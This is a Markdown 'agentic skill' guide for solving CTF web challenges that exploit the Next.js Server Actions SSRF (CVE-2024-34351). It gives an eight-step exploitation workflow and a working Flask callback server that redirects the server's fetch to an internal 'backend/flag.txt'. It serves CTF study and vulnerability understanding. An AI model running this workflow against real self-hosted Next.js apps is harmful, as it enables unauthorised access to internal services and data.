---
title: "Web Nextjs Server Actions Ssrf"
description: "Use when solving CTF web challenges involving self-hosted Next.js 13.4.0-14.1.0, Server Actions, Next-Action headers, relative redirects, Host or Origin header control, RSC responses, or suspected CVE-2024-3…"
published: "2026-09-21"
updated: "2026-09-21"
event: "Agentic Skills"
category: "Web Security"
kind: "skill"
status: "reference"
tags: ["agentic_skill", "Web Security", "Agentic Skills", "docker", "ssrf"]
readingTime: 3
wordCount: 467
featured: false
sourcePath: "~/ctf/writeups/ctf_skill_research/staging_skills/web-nextjs-server-actions-ssrf/SKILL.md"
---

# Web Next.js Server Actions SSRF

## When to use

Use this skill when you see:
- `next` versions `>=13.4.0 <14.1.1`.
- Source files with `"use server"` and `redirect("/...")`.
- Requests containing `Next-Action`, `Next-Router-State-Tree`, or `Accept: text/x-component`.
- A split frontend/backend Docker Compose where the flag or secret is on an internal service.
- A dependency audit mentioning CVE-2024-34351 or GHSA-fr5h-rqp8-mj6g.

Do not use this skill when:
- The app is purely static/client-side React.
- The Next.js version is patched and no equivalent Host/redirect fetch path exists.
- You cannot trigger a Server Action that redirects to a relative path.

## Core idea

Vulnerable self-hosted Next.js Server Actions may perform a server-side fetch after a relative redirect. If the fetch origin is derived from attacker-controlled `Host`/`Origin` headers, that fetch becomes an SSRF primitive. If the fetched response uses the React Server Component content type, the body may be streamed back instead of remaining blind.

## Recognition signals

Look for:
- `package.json` or lockfiles pinning vulnerable `next`.
- `npm audit` output for "Next.js Server-Side Request Forgery in Server Actions".
- Server Action forms in app-router pages.
- Relative redirects in action handlers.
- Internal service names in `docker-compose.yml`, such as `backend`, `api`, or `nginx`.
- Content type checks for `text/x-component`.

## Standard workflow

1. Confirm the Next.js version and hosting mode.
2. Find a Server Action endpoint and capture a legitimate POST request.
3. Confirm the action performs a relative redirect.
4. Replay the action with controlled `Host` and matching `Origin` headers.
5. Watch your callback server for a HEAD/GET to the redirected path.
6. Return `Content-Type: text/x-component` on preflight/response if the body is otherwise hidden.
7. Use an external redirect from your callback endpoint to pivot the server-side fetch to internal services.
8. Enumerate service names from Docker files before brute-forcing container IPs.

## Commands and tools

```bash
npm audit --omit=dev
rg -n '"use server"|redirect\\(|Next-Action|next' .

# Minimal callback server that makes the SSRF body readable in vulnerable flows.
python3 - <<'PY'
from flask import Flask, Response, redirect, request
app = Flask(__name__)
@app.route('/login', methods=['HEAD', 'GET'])
def login():
    if request.method == 'HEAD':
        r = Response('')
        r.headers['Content-Type'] = 'text/x-component'
        return r
    return redirect('http://backend/flag.txt')
app.run(host='0.0.0.0', port=80)
PY
```

## Pitfalls

Common ways agents get this wrong:
- Sending only `Host` and forgetting the `Origin`/CSRF relationship.
- Looking for ordinary route handlers instead of Server Actions.
- Missing that the first SSRF proof may be HEAD-only.
- Brute-forcing IPs before checking Docker service DNS names.
- Assuming Vercel-hosted apps are affected in the same way as self-hosted apps.

## Verification

Prove the solve path is real with:
- Version evidence from `package-lock.json` or `npm audit`.
- A captured Server Action request.
- Callback logs showing requests from the Next.js server.
- Response-body recovery, internal service response, or challenge flag-format check.

## Examples from writeups

| CTF | Challenge | Category | Lesson |
| --- | --------- | -------- | ------ |
| UIUCTF 2024 | Log Action | web | A vulnerable Next.js Server Action with a relative redirect let a controlled `Host` drive server-side fetches. |
| UIUCTF 2024 | Log Action | web | Returning `text/x-component` and redirecting the fetch converted blind SSRF into readable internal-file retrieval. |

## Sources

* https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/ - challenge walkthrough with source triage, `npm audit`, Host/Origin replay, and RSC content-type recovery.
* https://github.com/advisories/GHSA-fr5h-rqp8-mj6g - official advisory for CVE-2024-34351, affected versions, prerequisites, and patch.
* https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps - original research context for Next.js image and Server Actions SSRF patterns.
